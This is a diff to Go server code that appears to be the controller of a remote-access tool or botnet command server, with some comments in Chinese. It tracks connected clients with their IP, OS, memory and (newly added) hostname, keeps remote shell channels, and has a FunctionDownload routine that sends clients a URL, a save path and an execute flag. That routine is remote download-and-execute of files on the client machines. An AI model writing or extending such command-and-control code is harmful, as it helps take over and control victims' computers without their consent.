@@ -23,13 +23,13 @@ const SERVER_SHELL_ERROR = 12
 
 type CMSG struct {
 	sign  [10]byte
-	mod   uint8
+	mod   uint16
 	msg_l uint32
 }
 type CFILE struct{
 	address [255]byte
 	save_path [255]byte
-	execute uint8
+	execute uint16
 }
 func listen(port string) {
 	defer func() {
@@ -69,7 +69,7 @@ func doServerStuff(conn net.Conn) {
 				return
 			}
 			var msg = *(**CMSG)(unsafe.Pointer(&buf))
-			fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, msg.msg_l)
+			fmt.Printf("Recv:\n\tMSG: %s \n\tMOD: %d \n\tLONG: %d \n", msg.sign, msg.mod, int(msg.msg_l))
 			if string(msg.sign[:]) == "customize\x00" {
 				if msg.msg_l != 0 && msg.mod == SERVER_SYSTEMINFO { // 是第一次登陆带有系统信息的包
 					buf := make([]byte, msg.msg_l)
@@ -83,18 +83,19 @@ func doServerStuff(conn net.Conn) {
 					sp := strings.Split(string(buf[:]), "\n")
 					fmt.Println("len:", len(sp), string(buf[:]))
 					u1, _ := uuid.NewV4()
-					if len(sp) == 4 {
+					if len(sp) == 5 {
 						newS := S{
 							uuid:        u1.String(),
 							memory:      sp[2],
 							OS:          sp[1],
 							ip:          sp[0],
 							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
+							hostName:    sp[3],
 							status:      SERVER_HEARTS,
 							shellInChan: make(chan string),
 						}
 						serverMap[conn] = &newS
-						fmt.Println(sp[0], sp[1], sp[2])
+						fmt.Println(sp[0], sp[1], sp[2],sp[3])
 
 					} else {
 						newS := S{
@@ -103,12 +104,14 @@ func doServerStuff(conn net.Conn) {
 							OS:          "unknown",
 							ip:          "unknown",
 							intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
+							hostName:    "unknown",
 							status:      SERVER_HEARTS,
 							shellInChan: make(chan string),
 						}
 						serverMap[conn] = &newS
 					}
-					onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS)
+					onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS,serverMap[conn].hostName)
+					fmt.Println(onlineMsg)
 					Broadcast(onlineMsg)
 
 				}else{//第一次上线就直接给心跳包而不发system信息完全不知道他是谁的
@@ -150,6 +153,7 @@ func doServerStuff(conn net.Conn) {
 									OS:          sp[1],
 									ip:          sp[0],
 									intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
+									hostName:    sp[3],
 									status:      SERVER_HEARTS,
 									shellInChan: make(chan string),
 								}
@@ -163,12 +167,14 @@ func doServerStuff(conn net.Conn) {
 									OS:          "unknown",
 									ip:          "unknown",
 									intIp:       conn.RemoteAddr().String()[:strings.Index(conn.RemoteAddr().String(), ":")],
+									hostName:    "unknown",
 									status:      SERVER_HEARTS,
 									shellInChan: make(chan string),
 								}
 								serverMap[conn] = &newS
 							}
-							onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS)
+							onlineMsg := fmt.Sprintf("add|%s|%s|%s|%s|%s|%s", serverMap[conn].uuid, serverMap[conn].intIp, serverMap[conn].ip, serverMap[conn].memory, serverMap[conn].OS,serverMap[conn].hostName)
+							fmt.Println(onlineMsg)
 							Broadcast(onlineMsg)
 						}
 					}
@@ -233,7 +239,7 @@ func tlLoadMsg(code int, l int) CMSG {
 	}
 	msg := CMSG{
 		sign:  lSign,
-		mod:   uint8(code),
+		mod:   uint16(code),
 		msg_l: uint32(l),
 	}
 	return msg
@@ -361,7 +367,7 @@ func Handle(conn net.Conn, code int) {
 
 	}
 }
-func FunctionDownload(conn net.Conn,http string,savepath string,execute uint8){//一次性发包用
+func FunctionDownload(conn net.Conn,http string,savepath string,execute uint16){//一次性发包用
 	file := CFILE{
 		save_path:tlLoadPath(savepath),
 		address:tlLoadPath(http),
@@ -369,6 +375,7 @@ func FunctionDownload(conn net.Conn,http string,savepath string,execute uint8){/
 	}
 	msg := tlLoadMsg(SERVER_DOWNLOAD,511)
 	bMsg, _ := cstruct.Marshal(&msg)
+
 	l, err := conn.Write(bMsg)
 	if err != nil || l == 0 {
 		fmt.Println("Send Download Header Error")
